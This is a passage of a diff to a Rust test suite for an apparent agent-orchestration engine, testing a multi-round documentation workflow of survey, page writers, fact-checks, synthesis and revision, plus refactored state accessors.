+    let mut survey = survey_submit("p", &[("a", true), ("b", true)]);
+    survey["inventory"][0]["settings"] = json!(["limits.max_orders"]);
+    survey["inventory"][0]["names"] = json!(["cancel_order"]);
+    h.run("spawn documentation docs-survey p", survey);
+    h.run(
+        "spawn documentation docs p/a",
+        page_submit(
+            "p",
+            "a",
+            "## Cancel\n\n`cancel_order` stops at `limits.max_orders`.",
+        ),
+    );
+    let mut b = page_submit(
+        "p",
+        "b",
+        "## Refunds\n\nA refund calls `cancel_order` first.",
+    );
+    b["sections"][0]["body"] = json!("## Refunds\n\nA refund calls `cancel_order` first.");
+    h.run("spawn documentation docs p/b", b);
+    h.run(
+        "spawn fact-check docs-check p/a round 1",
+        check_submit(true),
+    );
+    h.run(
+        "spawn fact-check docs-check p/b round 1",
+        check_submit(true),
+    );
+    h.run(
+        "spawn documentation docs-synthesis p round 1",
+        synthesis_submit(true, vec![]),
+    );
     assert_eq!(
         h.summaries(),
         vec![
-            "spawn documentation docs p/core",
-            "spawn documentation docs p/web"
-        ]
+            "spawn documentation docs-revise p/a round 1",
+            "spawn documentation docs-revise p/b round 1",
+        ],
+        "a done pass does not end the loop while an engine check fails"
     );
-    let r = h.spawn_step("spawn documentation docs p/web");
-    assert_eq!(
-        r.inputs.docs_area.as_ref().map(|a| a.id.as_str()),
-        Some("web")
+    let a = h.spawn_step("spawn documentation docs-revise p/a round 1");
+    assert!(
+        a.inputs
+            .ox()
+            .docs_instructions
+            .iter()
+            .any(|i| i.starts_with("Add a `### For the user` block")),
+        "{:?}",
+        a.inputs.ox().docs_instructions
     );
-    assert_eq!(
-        r.inputs.docs_areas.len(),
-        2,
-        "each writer knows the other areas"
+    let b = h.spawn_step("spawn documentation docs-revise p/b round 1");
+    for start in ["Add 1 or 2 code excerpts", "Link to `a.md` in `Refunds`"] {
+        assert!(
+            b.inputs
+                .ox()
+                .docs_instructions
+                .iter()
+                .any(|i| i.starts_with(start)),
+            "{start}: {:?}",
+            b.inputs.ox().docs_instructions
+        );
+    }
+}
+
+#[test]
+fn b10_a_module_no_inventory_item_covers_keeps_the_loop_going() {
+    let mut h = docs_session(&["p"]);
+    h.ev(scanned("p", &["src", "web"], &[]));
+    h.run(
+        "spawn documentation docs-survey p",
+        survey_submit("p", &[("a", true)]),
     );
-    h.run("spawn documentation docs p/core", docs_submit("p"));
+    h.run("spawn documentation docs p/a", page_submit("p", "a", CLEAN));
+    h.run(
+        "spawn fact-check docs-check p/a round 1",
+        check_submit(true),
+    );
+    let r = h.spawn_step("spawn documentation docs-synthesis p round 1");
+    assert!(
+        r.inputs
+            .ox()
+            .docs_instructions
+            .iter()
+            .any(|f| f.contains("module `web`")),
+        "{:?}",
+        r.inputs.ox().docs_instructions
+    );
+    h.run(
+        "spawn documentation docs-synthesis p round 1",
+        synthesis_submit(true, vec![]),
+    );
     assert_eq!(
         h.summaries(),
-        vec!["spawn documentation docs p/web"],
-        "the part waits for every area"
+        vec!["spawn documentation docs-synthesis p round 2"],
+        "a done pass does not end the loop while a module has no owner"
     );
-    h.run("spawn documentation docs p/web", docs_submit("p"));
+    let mut add = synthesis_submit(false, vec![]);
+    add["inventory"] =
+        json!([{"id": "web-ui", "name": "The web console", "sources": ["web/"], "owner": "a"}]);
+    add["edits"] = json!([]);
+    h.run("spawn documentation docs-synthesis p round 2", add);
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn documentation docs-revise p/a round 2"]
+    );
+    let r = h.spawn_step("spawn documentation docs-revise p/a round 2");
+    assert!(
+        r.inputs.ox().docs_instructions[0].starts_with("Cover the new inventory item `web-ui`")
+    );
+    assert!(
+        r.inputs
+            .ox()
+            .docs_inventory
+            .iter()
+            .any(|i| i.starts_with("The web console"))
+    );
+    h.run(
+        "spawn documentation docs-revise p/a round 2",
+        page_submit("p", "a", "Now with the console."),
+    );
+    h.run(
+        "spawn fact-check docs-check p/a round 3",
+        check_submit(true),
+    );
+    h.run(
+        "spawn documentation docs-synthesis p round 3",
+        synthesis_submit(true, vec![]),
+    );
+    assert_eq!(h.summaries(), vec!["write-book p"]);
+    assert_eq!(h.state().book_update().parts[0].inventory.len(), 2);
+}
+
+#[test]
+fn b10_constants_no_page_mentions_reach_the_synthesis() {
+    let mut h = docs_session(&["p"]);
+    h.ev(scanned("p", &[], &["MAX_SLOTS", "TERM_QUEUE"]));
+    h.run(
+        "spawn documentation docs-survey p",
+        survey_submit("p", &[("a", true)]),
+    );
+    h.run(
+        "spawn documentation docs p/a",
+        page_submit("p", "a", "The cap is `MAX_SLOTS`."),
+    );
+    h.run(
+        "spawn fact-check docs-check p/a round 1",
+        check_submit(true),
+    );
+    let r = h.spawn_step("spawn documentation docs-synthesis p round 1");
+    let ox = r.inputs.ox();
+    let line = ox
+        .docs_instructions
+        .iter()
+        .find(|f| f.starts_with("reference (engine check)"))
+        .expect("the unmentioned constants");
+    assert!(
+        line.contains("1 of 2") && line.contains("`TERM_QUEUE`") && !line.contains("`MAX_SLOTS`"),
+        "{line}"
+    );
+}
+
+#[test]
+fn b10_the_survey_starts_one_writer_per_page() {
+    let mut h = docs_session(&["p"]);
+    h.run(
+        "spawn documentation docs-survey p",
+        survey_submit("p", &[("executors", true), ("security", true)]),
+    );
+    assert_eq!(
+        h.summaries(),
+        vec![
+            "spawn documentation docs p/executors",
+            "spawn documentation docs p/security"
+        ]
+    );
+    let r = h.spawn_step("spawn documentation docs p/security");
+    assert_eq!(
+        r.inputs.ox().docs_page.as_ref().map(|p| p.id.as_str()),
+        Some("security")
+    );
+    assert_eq!(
+        r.inputs.ox().docs_pages.len(),
+        2,
+        "each writer knows the whole page plan"
+    );
+    assert_eq!(
+        r.inputs.ox().docs_inventory,
+        vec!["security (src/)"],
+        "and the inventory it owns"
+    );
+}
+
+#[test]
+fn b10_each_round_checks_then_synthesizes_then_revises() {
+    let mut h = docs_session(&["p"]);
+    h.run(
+        "spawn documentation docs-survey p",
+        survey_submit("p", &[("a", true), ("b", true)]),
+    );
+    h.run("spawn documentation docs p/a", page_submit("p", "a", CLEAN));
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn documentation docs p/b"],
+        "the first round waits for every first draft"
+    );
+    h.run("spawn documentation docs p/b", page_submit("p", "b", CLEAN));
+    assert_eq!(
+        h.summaries(),
+        vec![
+            "spawn fact-check docs-check p/a round 1",
+            "spawn fact-check docs-check p/b round 1"
+        ]
+    );
+    let r = h.spawn_step("spawn fact-check docs-check p/a round 1");
+    assert!(r.inputs.ox().docs_check);
+    assert_eq!(
+        r.inputs.target,
+        Some(root().join("ostra-docs-drafts/p/a.md"))
+    );
+    assert_eq!(
+        r.inputs.spec_file,
+        Some(root().join("ostra-docs-drafts/p/inventory.md"))
+    );
+    h.run(
+        "spawn fact-check docs-check p/a round 1",
+        check_submit(true),
+    );
+    h.run(
+        "spawn fact-check docs-check p/b round 1",
+        check_submit(true),
+    );
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn documentation docs-synthesis p round 1"]
+    );
+    h.run(
+        "spawn documentation docs-synthesis p round 1",
+        synthesis_submit(false, vec![("a", "Move the slot rules to `b.md`.")]),
+    );
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn documentation docs-revise p/a round 1"]
+    );
+    let r = h.spawn_step("spawn documentation docs-revise p/a round 1");
+    assert_eq!(
+        r.inputs.ox().docs_instructions,
+        vec!["Move the slot rules to `b.md`."]
+    );
+    assert_eq!(
+        r.inputs.target,
+        Some(root().join("ostra-docs-drafts/p/a.md")),
+        "the revision reads its draft"
+    );
+    h.run(
+        "spawn documentation docs-revise p/a round 1",
+        page_submit("p", "a", "A new draft."),
+    );
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn fact-check docs-check p/a round 2"],
+        "the next round checks only the revised page"
+    );
+    let r = h.spawn_step("spawn fact-check docs-check p/a round 2");
+    assert_eq!(r.inputs.prior_findings.as_deref(), Some("none"));
+    h.run(
+        "spawn fact-check docs-check p/a round 2",
+        check_submit(true),
+    );
+    h.run(
+        "spawn documentation docs-synthesis p round 2",
+        synthesis_submit(true, vec![]),
+    );
     assert_eq!(h.summaries(), vec!["write-book p"]);
     let update = h.state().book_update();
-    let ids: Vec<&str> = update.parts[0]
-        .1
-        .sections
-        .iter()
-        .map(|s| s.id.as_str())
-        .collect();
-    assert_eq!(
-        ids,
-        ["p-orders", "p-orders-web"],
-        "a clashing section ID takes its area"
+    let ostra_core::book::PageUpdate::Write(page) = &update.parts[0].pages[0] else {
+        panic!("the page is written");
+    };
+    assert!(page.body.starts_with("A new draft."));
+    assert_eq!(page.group, "How it works");
+}
+
+#[test]
+fn b10_a_failed_check_and_an_engine_check_force_a_revision() {
+    let mut h = docs_session(&["p"]);
+    h.run(
+        "spawn documentation docs-survey p",
+        survey_submit("p", &[("a", true), ("b", true)]),
     );
-    assert!(update.areas["p"].iter().all(|(_, sub)| sub.is_some()));
+    h.run("spawn documentation docs p/a", page_submit("p", "a", CLEAN));
+    h.run(
+        "spawn documentation docs p/b",
+        page_submit("p", "b", "It would fail. See [x](gone.md)."),
+    );
+    h.run(
+        "spawn fact-check docs-check p/a round 1",
+        check_submit(false),
+    );
+    h.run(
+        "spawn fact-check docs-check p/b round 1",
+        check_submit(true),
+    );
+    let r = h.spawn_step("spawn documentation docs-synthesis p round 1");
+    assert!(
+        r.inputs
+            .ox()
+            .docs_instructions
+            .iter()
+            .any(|f| f.starts_with("b (engine check)")),
+        "{:?}",
+        r.inputs.ox().docs_instructions
+    );
+    h.run(
+        "spawn documentation docs-synthesis p round 1",
+        synthesis_submit(true, vec![]),
+    );
+    assert_eq!(
+        h.summaries(),
+        vec![
+            "spawn documentation docs-revise p/a round 1",
+            "spawn documentation docs-revise p/b round 1"
+        ],
+        "a done pass does not close failed checks or engine checks"
+    );
+    let a = h.spawn_step("spawn documentation docs-revise p/a round 1");
+    assert!(a.inputs.ox().docs_instructions[0].contains("The code says 4."));
+    let b = h.spawn_step("spawn documentation docs-revise p/b round 1");
+    assert!(
+        b.inputs
+            .ox()
+            .docs_instructions
+            .iter()
+            .any(|i| i.contains("`gone.md`"))
+    );
+    assert!(
+        b.inputs
+            .ox()
+            .docs_instructions
+            .iter()
+            .any(|i| i.contains("\"would\""))
+    );
 }
 
 #[test]
-fn b9_area_writers_share_the_session_cap() {
-    let mut h = docs_session_unplanned(&["p"]);
-    let areas: Vec<_> = ["a", "b", "c", "d", "e", "f"]
-        .iter()
-        .map(|i| area(i))
-        .collect();
-    plan_docs(&mut h, "p", areas);
-    let spawns = h
-        .summaries()
-        .into_iter()
-        .filter(|s| s.starts_with("spawn documentation"))
-        .count();
-    assert_eq!(spawns, ostra_engine::plan::MAX_DOCS_WRITERS);
-}
-
-#[test]
-fn b9_an_abandoned_area_keeps_the_rest_of_the_part() {
-    let mut h = docs_session_unplanned(&["p"]);
-    plan_docs(&mut h, "p", vec![area("core"), area("web")]);
-    h.run("spawn documentation docs p/core", docs_submit("p"));
-    let (id, _) = h.start("spawn documentation docs p/web");
-    h.finish(&id, ExecutionStatus::Error, None);
-    let g = h.open_gate("execution_failed");
+fn b10_after_three_rounds_a_gate_asks_for_another_round_or_the_book() {
+    let mut h = docs_session(&["p"]);
+    h.run(
+        "spawn documentation docs-survey p",
+        survey_submit("p", &[("a", true)]),
+    );
+    h.run("spawn documentation docs p/a", page_submit("p", "a", CLEAN));
+    for round in 1..=3 {
+        h.run(
+            &format!("spawn fact-check docs-check p/a round {round}"),
+            check_submit(true),
+        );
+        h.run(
+            &format!("spawn documentation docs-synthesis p round {round}"),
+            synthesis_submit(false, vec![("a", "Merge the two cap tables.")]),
+        );
+        if round < 3 {
+            h.run(
+                &format!("spawn documentation docs-revise p/a round {round}"),
+                page_submit("p", "a", CLEAN),
+            );
+        }
+    }
+    let g = h.open_gate("docs_rounds");
+    assert_eq!(
+        h.summaries(),
+        vec![] as Vec<String>,
+        "nothing runs while the gate is open"
+    );
     h.answer(
         &g,
         GateAnswer::Choice {
-            option: "abandon".into(),
+            option: "continue".into(),
+            text: None,
+        },
+    );
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn documentation docs-revise p/a round 3"]
+    );
+    h.run(
+        "spawn documentation docs-revise p/a round 3",
+        page_submit("p", "a", CLEAN),
+    );
+    h.run(
+        "spawn fact-check docs-check p/a round 4",
+        check_submit(true),
+    );
+    h.run(
+        "spawn documentation docs-synthesis p round 4",
+        synthesis_submit(false, vec![("a", "Merge the two cap tables.")]),
+    );
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn documentation docs-revise p/a round 4"],
+        "no gate until round 6"
+    );
+}
+
+#[test]
+fn b10_accepting_the_book_ends_the_loop() {
+    let mut h = docs_session(&["p"]);
+    h.run(
+        "spawn documentation docs-survey p",
+        survey_submit("p", &[("a", true)]),
+    );
+    h.run("spawn documentation docs p/a", page_submit("p", "a", CLEAN));
+    for round in 1..=3 {
+        h.run(
+            &format!("spawn fact-check docs-check p/a round {round}"),
+            check_submit(true),
+        );
+        h.run(
+            &format!("spawn documentation docs-synthesis p round {round}"),
+            synthesis_submit(false, vec![("a", "Merge the two cap tables.")]),
+        );
+        if round < 3 {
+            h.run(
+                &format!("spawn documentation docs-revise p/a round {round}"),
+                page_submit("p", "a", CLEAN),
+            );
+        }
+    }
+    let g = h.open_gate("docs_rounds");
+    h.answer(
+        &g,
+        GateAnswer::Choice {
+            option: "accept".into(),
             text: None,
         },
     );
     assert_eq!(h.summaries(), vec!["write-book p"]);
-    let update = h.state().book_update();
-    assert!(
-        update.areas["p"][1].1.is_none(),
-        "the web area keeps what the book holds"
-    );
 }
 
 #[test]
-fn b9_after_a_build_only_the_touched_areas_are_rewritten() {
-    let mut h = H::plan_approved(
-        &["p"],
-        one_phase(),
-        SessionOptions {
-            docs: true,
-            tests: false,
-            yolo: false,
-            track: None,
-        },
+fn b10_a_page_the_survey_keeps_gets_no_writer() {
+    let mut h = docs_session(&["p"]);
+    h.run(
+        "spawn documentation docs-survey p",
+        survey_submit("p", &[("a", false), ("b", true)]),
     );
-    h.run("spawn implementer", impl_submit(1, &["web/app.ts"]));
-    h.run("spawn code-reviewer", review(&[]));
-    h.command(CommandPurpose::Stage, "p");
-    h.accept();
-    h.command(CommandPurpose::Format, "p");
-    let g = h.open_gate("closing_gate");
-    h.answer(
-        &g,
-        GateAnswer::Closing {
-            items: vec![ClosingChoice {
-                project: "p".into(),
-                tests: false,
-                docs: true,
-            }],
-        },
+    assert_eq!(h.summaries(), vec!["spawn documentation docs p/b"]);
+    h.run("spawn documentation docs p/b", page_submit("p", "b", CLEAN));
+    h.run(
+        "spawn fact-check docs-check p/b round 1",
+        check_submit(true),
     );
-    assert_eq!(h.summaries(), vec!["plan-docs p"]);
-    let book_areas = Some(vec!["core".to_string(), "web".to_string()]);
-    plan_docs_with(
-        &mut h,
-        "p",
-        vec![area("core"), area("web")],
-        book_areas,
-        vec!["web".into()],
+    h.run(
+        "spawn documentation docs-synthesis p round 1",
+        synthesis_submit(true, vec![]),
     );
-    assert_eq!(h.summaries(), vec!["spawn documentation docs p/web"]);
-    h.run("spawn documentation docs p/web", docs_submit("p"));
     assert_eq!(h.summaries(), vec!["write-book p"]);
     let update = h.state().book_update();
-    let kept: Vec<bool> = update.areas["p"].iter().map(|(_, s)| s.is_none()).collect();
-    assert_eq!(kept, [true, false], "core is kept from the book");
+    let kept: Vec<bool> = update.parts[0]
+        .pages
+        .iter()
+        .map(|p| matches!(p, ostra_core::book::PageUpdate::Keep { .. }))
+        .collect();
+    assert_eq!(kept, [true, false], "a keeps its page from the book");
 }
 
 #[test]
-fn b9_a_book_without_these_areas_gets_every_area() {
-    let mut h = H::plan_approved(
-        &["p"],
-        one_phase(),
-        SessionOptions {
-            docs: true,
-            tests: false,
-            yolo: false,
-            track: None,
-        },
+fn b10_a_run_that_answers_another_step_fails() {
+    let mut h = docs_session(&["p"]);
+    h.run(
+        "spawn documentation docs-survey p",
+        page_submit("p", "a", CLEAN),
     );
-    h.run("spawn implementer", impl_submit(1, &["web/app.ts"]));
-    h.run("spawn code-reviewer", review(&[]));
-    h.command(CommandPurpose::Stage, "p");
-    h.accept();
-    h.command(CommandPurpose::Format, "p");
-    let g = h.open_gate("closing_gate");
-    h.answer(
-        &g,
-        GateAnswer::Closing {
-            items: vec![ClosingChoice {
-                project: "p".into(),
-                tests: false,
-                docs: true,
-            }],
-        },
-    );
-    plan_docs_with(
-        &mut h,
-        "p",
-        vec![area("core"), area("web")],
-        Some(vec![]),
-        vec!["web".into()],
-    );
+    assert_eq!(h.summaries(), vec!["gate execution_failed"]);
+}
+
+#[test]
+fn b10_a_whole_part_writer_from_an_older_log_still_folds() {
+    let mut h = docs_session(&["p"]);
+    let id = ExecutionId::new();
+    h.ev(SessionEvent::ExecutionStarted {
+        projects: Vec::new(),
+        id: id.clone(),
+        agent: AgentName::Documentation,
+        purpose: serde_json::from_value(json!({"kind": "docs", "project": "p"})).unwrap(),
+        stage: StageKind::Documentation,
+        project: "p".into(),
+        executor: ExecutorKind::Native,
+        model: "mock:m".into(),
+        params: json!({}),
+        spawn_block: String::new(),
+        report_path: None,
+        resumes: None,
+        contract: None,
+    });
     assert_eq!(
         h.summaries(),
-        vec![
-            "spawn documentation docs p/core",
-            "spawn documentation docs p/web"
-        ]
+        vec![] as Vec<String>,
+        "no survey starts beside it"
     );
+    let mut part = page_submit("p", "orders", CLEAN);
+    part["step"] = json!("part");
+    h.finish(&id, ExecutionStatus::Ok, Some(part));
+    assert_eq!(h.summaries(), vec!["write-book p"]);
 }
 
 #[test]
-fn b4_architecture_runs_only_for_two_or_more_projects() {
+fn b4_a_book_of_two_projects_is_written_after_every_part_with_no_architecture_run() {
     let mut h = docs_session(&["a", "b"]);
     assert_eq!(
         h.summaries(),
-        vec!["spawn documentation docs a", "spawn documentation docs b"]
-    );
-    h.run("spawn documentation docs a", docs_submit("a"));
-    assert_eq!(
-        h.summaries(),
-        vec!["spawn documentation docs b"],
-        "the book waits for every part"
-    );
-    h.run("spawn documentation docs b", docs_submit("b"));
-    assert_eq!(
-        h.summaries(),
-        vec!["spawn system-architecture architecture"]
-    );
-    let r = h.spawn_step("spawn system-architecture");
-    assert_eq!(r.inputs.target, Some(root().join("ostra-docs-parts.json")));
-    assert_eq!(
-        r.inputs.projects_in_scope,
         vec![
-            ("a".to_string(), PathBuf::from("/code/a")),
-            ("b".to_string(), PathBuf::from("/code/b"))
+            "spawn documentation docs-survey a",
+            "spawn documentation docs-survey b"
         ]
     );
-    h.run("spawn system-architecture architecture", arch_submit());
+    finish_docs(&mut h, "a");
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn documentation docs-survey b"],
+        "the book waits for every part"
+    );
+    finish_docs(&mut h, "b");
     assert_eq!(h.summaries(), vec!["write-book a_b"]);
 }
 
 #[test]
-fn b4_an_abandoned_part_leaves_one_project_and_no_architecture() {
+fn b4_an_abandoned_part_leaves_a_book_of_one_project() {
     let mut h = docs_session(&["a", "b"]);
-    h.run("spawn documentation docs a", docs_submit("a"));
-    let (id, _) = h.start("spawn documentation docs b");
+    finish_docs(&mut h, "a");
+    let (id, _) = h.start("spawn documentation docs-survey b");
     h.finish(&id, ExecutionStatus::Error, None);
     let g = h.open_gate("execution_failed");
     h.answer(
@@ -2896,8 +3318,7 @@ fn b6_a_picked_book_names_the_write() {
         *docs_book = Some("handbook".into());
     }
     h.decide(JudgeKind::Classify, None, json!({"category": "DOCS", "projects": ["p"], "explore_tasks": [], "opts_in": {"tests": false, "docs": true}, "reason": "r"}));
-    plan_docs(&mut h, "p", vec![]);
-    h.run("spawn documentation docs p", docs_submit("p"));
+    finish_docs(&mut h, "p");
     assert_eq!(h.summaries(), vec!["write-book handbook"]);
 }
 
@@ -2905,7 +3326,7 @@ fn b6_a_picked_book_names_the_write() {
 fn b6_a_book_update_replaces_the_projects_part() {
     use ostra_core::book::{Book, BookPart, GlossaryEntry, merge};
     let mut h = docs_session(&["a"]);
-    h.run("spawn documentation docs a", docs_submit("a"));
+    finish_docs(&mut h, "a");
     let update = h.state().book_update();
     let at = chrono::Utc::now();
     let old_part = |project: &str| BookPart {
@@ -2913,7 +3334,7 @@ fn b6_a_book_update_replaces_the_projects_part() {
         overview: "old".into(),
         sections: vec![],
         updated_at: at,
-        areas: vec![],
+        inventory: vec![],
     };
     let existing = Book {
         id: "a_b".into(),
@@ -2921,7 +3342,6 @@ fn b6_a_book_update_replaces_the_projects_part() {
         projects: vec!["a".into(), "b".into()],
         updated_at: at,
         sessions: vec!["s0".into()],
-        architecture: None,
         parts: vec![old_part("a"), old_part("b")],
         glossary: vec![
             GlossaryEntry {
@@ -3090,13 +3510,13 @@ fn init_generates_at_most_eight_skills_by_default() {
     let skills: Vec<Value> = (0..12)
         .map(|i| json!({"name": format!("s{i}"), "kind": "creation", "status": "new", "recommend": true}))
         .collect();
-    let proposals = ostra_engine::init::proposals(&json!({"skills": skills}));
+    let proposals = ostra_default_plugin::init::proposals(&json!({"skills": skills}));
     assert_eq!(
         proposals
             .iter()
             .filter(|p| p.disposition == "generate")
             .count(),
-        ostra_engine::init::MAX_DEFAULT_GENERATE
+        ostra_default_plugin::init::MAX_DEFAULT_GENERATE
     );
     assert_eq!(
         proposals.iter().filter(|p| p.disposition == "drop").count(),
@@ -3126,6 +3546,7 @@ fn init_session() -> H {
         uploads: vec![],
         pinned: vec![],
         docs_book: None,
+        workflow: None,
     });
     h
 }
@@ -3227,7 +3648,7 @@ fn track_is_judged_after_research_and_light_skips_spec_and_plan() {
     assert_eq!(req.inputs.research_docs.len(), 1);
     assert!(req.inputs.phase.unwrap().file.is_none());
     let st = h.state();
-    assert!(st.spec.runs.is_empty() && st.stakes.is_none());
+    assert!(st.ext.os().spec.runs.is_empty() && st.ext.os().stakes.is_none());
 }
 
 #[test]
@@ -3260,7 +3681,7 @@ fn track_forced_on_the_new_task_form_skips_the_judge() {
 #[test]
 fn track_can_be_overridden_until_a_phase_starts() {
     let mut h = light(&["p"]);
-    let id = h.state().track_decision.clone().unwrap();
+    let id = h.state().ext.os().track_decision.clone().unwrap();
     assert!(h.state().can_override(&id));
     h.ev(SessionEvent::DecisionOverridden {
         id: id.clone(),
@@ -3268,7 +3689,7 @@ fn track_can_be_overridden_until_a_phase_starts() {
         reason: "user".into(),
     });
     assert_eq!(h.summaries(), vec!["spawn generate-spec spec#1"]);
-    assert!(h.state().phases.is_empty());
+    assert!(h.state().ext.os().phases.is_empty());
 }
 
 // ------------------------------------------------------------------------------------------
@@ -3291,7 +3712,7 @@ fn f1_feedback_builds_a_reviewed_revision_then_asks_again() {
     );
     assert_eq!(h.summaries(), vec!["spawn implementer phase 2 initial"]);
     let req = h.spawn_step("spawn implementer phase 2");
-    assert_eq!(req.inputs.revision, Some(1));
+    assert_eq!(req.inputs.ox().revision, Some(1));
     assert!(
         req.inputs
             .task
@@ -3300,11 +3721,11 @@ fn f1_feedback_builds_a_reviewed_revision_then_asks_again() {
             .contains("only for open orders")
     );
     assert_eq!(
-        req.inputs.context_files,
+        req.inputs.ox().context_files,
         vec![root().join("ostra-session-context.md")]
     );
     assert_eq!(
-        req.inputs.prior_reports,
+        req.inputs.ox().prior_reports,
         vec![PathBuf::from(
             "/ws/.ostra/sessions/s1/p/ostra-implementer-phase-1.md"
         )]
@@ -3351,7 +3772,7 @@ fn f1_feedback_across_projects_is_judged_and_builds_one_revision_per_target() {
             "spawn implementer phase 4 initial"
         ]
     );
-    assert_eq!(h.state().phases[&4].info.project, "web");
+    assert_eq!(h.state().ext.os().phases[&4].info.project, "web");
 }
 
 #[test]
@@ -3370,7 +3791,7 @@ fn f1_a_requirement_change_goes_into_the_spec_before_the_revision() {
     );
     // Rule D10: the spec changes first; no revision is built yet.
     let spec = h.spawn_step("spawn generate-spec spec#2");
-    assert!(spec.inputs.changes[0].contains("shipping fee"));
+    assert!(spec.inputs.ox().changes[0].contains("shipping fee"));
     h.run("spawn generate-spec", spec_submit(0, 0));
     h.run(
         "spawn fact-check fact-check-spec",
@@ -3386,7 +3807,7 @@ fn f1_a_requirement_change_goes_into_the_spec_before_the_revision() {
     );
     // The approved plan stays; the change builds as a revision phase.
     assert_eq!(h.summaries(), vec!["spawn implementer phase 2 initial"]);
-    assert_eq!(h.state().plan.runs.len(), 1);
+    assert_eq!(h.state().ext.os().plan.runs.len(), 1);
 }
 
 #[test]
@@ -3399,8 +3820,8 @@ fn f1_yolo_accepts_the_implementation() {
     let st = h.state();
     let gate = st.open_gates().next().unwrap().id.clone();
     assert!(matches!(
-        ostra_engine::judge_input::yolo_plan(&st, &gate),
-        Some(ostra_engine::judge_input::YoloPlan::Fixed { .. })
+        ostra_default_plugin::judge_input::yolo_plan(&st, &gate),
+        Some(ostra_default_plugin::judge_input::YoloPlan::Fixed { .. })
     ));
 }
 
@@ -3448,11 +3869,11 @@ fn j1_a_research_answer_runs_explore_before_the_spec() {
     );
     h.run("spawn explore explore#1", explore_submit(1, &[]));
     let rerun = h.spawn_step("spawn generate-spec");
-    let answers = &rerun.inputs.answers;
+    let answers = &rerun.inputs.ox().answers;
     assert_eq!(answers[0], qa("Q1", "A"));
     assert!(answers[1].answer.starts_with("Run a research pass\n"));
     assert_eq!(
-        rerun.inputs.new_research_docs,
+        rerun.inputs.ox().new_research_docs,
         vec![PathBuf::from(
             "/ws/.ostra/sessions/s1/p/ostra-research-1.md"
         )]
@@ -3479,10 +3900,10 @@ fn j1_research_is_capped_and_kept_in_the_session_projects() {
     );
     let st = h.state();
     assert_eq!(
-        st.explore.len(),
-        1 + ostra_engine::judge::MAX_ANSWER_RESEARCH
+        st.ext.os().explore.len(),
+        1 + ostra_default_plugin::judge::MAX_ANSWER_RESEARCH
     );
-    assert!(st.explore.iter().all(|t| t.project == "p"));
+    assert!(st.ext.os().explore.iter().all(|t| t.project == "p"));
 }
 
 #[test]
@@ -3507,7 +3928,7 @@ fn j1_discarded_and_remembered_answers_do_not_reach_the_spec() {
         ], "research": [], "reason": "r"}),
     );
     let rerun = h.spawn_step("spawn generate-spec");
-    let answers = rerun.inputs.answers;
+    let answers = rerun.inputs.ox().answers;
     assert!(!answers[0].answer.contains("Ignore this one"));
     assert!(answers[0].answer.contains("chose not to answer"));
     assert!(answers[1].answer.contains("later stage"));
@@ -3559,7 +3980,7 @@ fn j1_approval_text_waits_for_the_judge() {
         },
     );
     assert_eq!(h.summaries(), vec![format!("judge route-answer {g}")]);
-    assert!(!h.state().spec.approved);
+    assert!(!h.state().ext.os().spec.approved);
     h.route(
         &g,
         json!({"route": "implementation_detail", "items": [
@@ -3568,11 +3989,11 @@ fn j1_approval_text_waits_for_the_judge() {
     );
     let st = h.state();
     assert!(
-        st.spec.approved,
+        st.ext.os().spec.approved,
         "a note for later stages keeps the approval"
     );
     assert_eq!(
-        st.notes_for(ostra_engine::judge::NoteStage::Docs),
+        st.notes_for(ostra_default_plugin::judge::NoteStage::Docs),
         vec!["Mention the new flag."]
     );
     assert_eq!(h.summaries(), vec!["judge stakes"]);
@@ -3592,10 +4013,10 @@ fn j1_a_delivered_approval_text_changes_the_spec_even_when_approved() {
         },
     );
     h.deliver(&g);
-    assert!(!h.state().spec.approved);
+    assert!(!h.state().ext.os().spec.approved);
     let rev = h.spawn_step("spawn generate-spec");
     assert_eq!(
-        rev.inputs.changes,
+        rev.inputs.ox().changes,
         vec!["Approved, but cancellations must also refund the fee.".to_string()]
     );
 }
@@ -3652,7 +4073,7 @@ fn j1_a_discarded_stuck_answer_leaves_the_phase_blocked() {
         &g,
         json!({"route": "implementation_detail", "items": [{"id": "answer", "disposition": "discard", "stages": [], "note": ""}], "research": [], "reason": "r"}),
     );
-    assert!(h.state().phases[&1].impl_loop.is_blocked());
+    assert!(h.state().ext.os().phases[&1].impl_loop.is_blocked());
 }
 
 #[test]
@@ -3668,7 +4089,7 @@ fn j1_feedback_kept_for_later_accepts_and_discarded_feedback_asks_again() {
         Some("0"),
         json!({"route": "implementation_detail", "targets": [{"project": "p", "instruction": "x"}], "items": [{"id": "answer", "disposition": "remember", "stages": ["docs"], "note": "Mention the flag."}], "research": [], "reason": "r"}),
     );
-    assert!(h.state().feedback.accepted);
+    assert!(h.state().ext.os().feedback.accepted);
     assert_eq!(h.summaries(), vec!["command format p"]);
 
     let mut h = light(&["p"]);
@@ -3679,7 +4100,7 @@ fn j1_feedback_kept_for_later_accepts_and_discarded_feedback_asks_again() {
         Some("0"),
         json!({"route": "implementation_detail", "targets": [{"project": "p", "instruction": "x"}], "items": [{"id": "answer", "disposition": "discard", "stages": [], "note": ""}], "research": [], "reason": "r"}),
     );
-    assert_eq!(h.state().phases.len(), 1, "no revision is built");
+    assert_eq!(h.state().ext.os().phases.len(), 1, "no revision is built");
     assert_eq!(h.summaries(), vec!["gate implementation_review"]);
 }
 
@@ -3704,7 +4125,7 @@ fn j1_answers_recorded_before_the_rule_fold_as_they_did() {
 
 #[test]
 fn j1_only_answers_with_content_are_routed() {
-    use ostra_engine::state::answer_needs_route;
+    use ostra_default_plugin::fold::answer_needs_route;
     let approval = GatePayload::SpecApproval {
         spec_path: PathBuf::new(),
         summary: String::new(),
@@ -3743,7 +4164,7 @@ fn j1_a_typed_answer_reaches_the_spec_with_the_numbered_options() {
         },
     );
     h.deliver(&g);
-    let answers = h.spawn_step("spawn generate-spec").inputs.answers;
+    let answers = h.spawn_step("spawn generate-spec").inputs.ox().answers;
     assert!(
         answers[0]
             .answer
@@ -3783,14 +4204,17 @@ fn j1_a_later_answer_forgets_a_kept_note() {
         &g,
         json!({"route": "implementation_detail", "items": [], "research": [], "forget": ["N1"], "reason": "stale"}),
     );
-    assert!(!h.state().user_notes[0].forgotten);
+    assert!(!h.state().ext.os().user_notes[0].forgotten);
     h.route(
